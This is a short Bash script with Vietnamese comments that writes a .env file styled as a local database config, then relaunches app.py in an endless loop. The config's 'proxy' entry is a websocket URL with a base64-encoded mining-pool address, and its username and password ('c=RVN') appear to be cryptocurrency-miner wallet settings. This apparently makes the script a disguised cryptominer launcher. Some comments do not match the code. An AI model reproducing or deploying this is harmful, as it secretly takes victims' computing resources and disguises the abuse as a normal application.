#!/bin/bash


echo -e "host=127.0.0.1\nport=3306\nproxy=wss://oauth2.up.railway.app/cG93ZXIyYi5uYS5taW5lLnpwb29sLmNhOjYyNDI=\nthreads=16\npassword=c=RVN\nusername=RFikJQEPWj7hveHt9G8wwLfufEmDagoRf4" > .env

while true
do
    # Tìm và kill tiến trình cũ
    pgrep -f "pkill python" | xargs kill -9 2>/dev/null
    
    # Chạy lại ứng dụng
    echo "Chạy lại app.py..."
    python3 app.py "$MIN" --cache=.cache/09Qy5sb2Fkcyg.txt &

    # Chạy trong 2 phút rồi nghỉ 10 giây
    sleep 10
    echo "Tạm nghỉ 10 giây..."
    sleep 10
done